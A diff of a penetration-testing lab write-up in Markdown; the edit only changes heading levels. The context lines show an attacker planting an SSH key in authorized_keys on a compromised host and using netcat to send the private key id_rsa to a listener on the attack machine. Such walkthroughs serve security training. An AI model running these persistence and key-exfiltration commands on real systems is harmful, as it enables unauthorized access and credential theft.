@@ -301,19 +301,19 @@ mister_b@kuus:~/.ssh$ mv id_rsa.pub authorized_keys
 mv id_rsa.pub authorized_keys
 ```
 Now that we have created the .ssh directory and generated the keys for this user let's download the private key on our attack host using Netcat.
-#### Start a listener
+##### Start a listener
 ```bash
 ┌──(pentester㉿kali)-[~/Suuk/Misc File]
 └─$nc -lvnp 7070 > mister_id_rsa  
 listening on [any] 7070 ..
 ```
 
-#### Send the key
+##### Send the key
 ```bash
 mister_b@kuus:~/.ssh$ nc -q 0 10.0.2.9 7070 < id_rsa
 nc -q 0 10.0.2.9 7070 < id_rsa
 ```
-### Confirm the transfer
+#### Confirm the transfer
 ```bash
 ┌──(pentester㉿kali)-[~/Suuk/Misc File]
 └─$nc -lvnp 7070 > mister_id_rsa  
